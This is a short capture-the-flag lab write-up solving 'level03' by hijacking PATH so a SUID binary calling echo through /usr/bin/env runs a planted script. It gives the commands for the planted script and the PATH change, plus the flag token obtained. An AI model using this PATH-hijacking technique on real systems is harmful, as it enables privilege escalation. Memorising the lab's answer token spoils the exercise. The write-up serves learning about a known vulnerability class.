# Level03 Solution

## Steps:
1. Connected via SSH: `ssh level03@192.168.16.128 -p 4242`
2. Analyzed the binary `level03`:
   - Command: `ltrace ./level03`
   - Output: `system("/usr/bin/env echo Exploit me")`
   - The binary uses `/usr/bin/env` to call `echo`, which is vulnerable to PATH hijacking.
3. Exploited PATH hijacking:
   - Created a malicious `echo` script in `/tmp`:
     ```bash
     echo '/bin/getflag' > /tmp/echo
     chmod +x /tmp/echo
     ```
   - Modified the PATH to prioritize `/tmp`:
     ```bash
     export PATH=/tmp:$PATH
     ```
4. Ran the binary:
   - Command: `./level03`
   - Output: `Check flag.Here is your token : qi0maab88jeaj46qoumi7maus`

## Notes:
- The binary is SUID and owned by `flag03`, but it calls `echo` via `/usr/bin/env` without an absolute path.
- By hijacking the PATH, we can make it execute our malicious `echo` script instead of the real one.
- The malicious script runs `/bin/getflag`, which gives the token for `flag03`.

## Tools used:
- `ltrace` (to trace library calls)
- `export` (to modify PATH)
- `chmod` (to make the script executable)